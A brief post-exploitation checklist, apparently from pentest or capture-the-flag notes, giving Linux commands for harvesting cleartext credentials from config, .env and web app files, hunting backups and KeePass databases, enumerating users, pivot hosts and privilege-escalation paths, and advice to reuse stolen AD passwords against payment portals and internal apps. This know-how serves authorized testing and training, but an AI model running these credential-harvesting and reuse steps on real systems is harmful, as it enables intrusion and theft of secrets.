# Post-Shell Loot Checklist

Things to check immediately after landing any shell, before running a full linpeas pass:

```bash
cat *.config *.env *.ini 2>/dev/null          # cleartext creds in app config files, cwd first
find / -iname '*backup*' -o -iname '*.kdbx' -o -iname '*.apk' 2>/dev/null
cat /etc/passwd | grep -v nologin             # other real users to target
cat /etc/hosts                                 # internal hostnames for pivoting
sudo -l                                        # before touching linpeas
grep -ri "password\|secret\|key" /var/www/*/config* 2>/dev/null   # app DB/API creds often reused as OS creds
cat /etc/*release ; uname -a                   # fingerprint OS/kernel version -> check against known CVEs (Dirty Pipe CVE-2022-0847, CVE-2024-1086) before enumerating further
id ; groups                                     # check group memberships (adm, docker, disk, etc. — each implies a privesc path)
ls -la /var/log/*.log 2>/dev/null               # readable logs (adm-group access) can leak other users' creds
```

On a domain box: once you have any valid AD credential, also try it against secondary business apps reachable from the same network (payment portals, ticketing, internal wikis) — separate-looking systems often share or replicate AD passwords with no independent re-authentication.

